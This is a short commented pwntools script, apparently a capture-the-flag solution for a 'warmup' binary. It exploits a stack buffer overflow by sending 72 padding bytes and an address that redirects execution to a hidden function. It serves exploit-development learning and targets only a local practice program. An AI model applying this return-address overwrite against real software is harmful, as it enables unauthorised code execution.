#!/usr/bin/env python3

from pwn import*
#opens up the warmup process
pw = process("./warmup")
#attaches a gdb debugger to the program
gdb.attach(pw, gdbscript = 'b *0x40060e')
#receives the input up until the ">"
pw.recvuntil(b">")
#the payload fills the buffer with 72 A's and adds it to the easy function.
value = pw.sendline(b"A"* 72 + p64(0x0040060d))
#allows you to interact with the program (for example, if you wanted to input a value.)
pw.interactive()
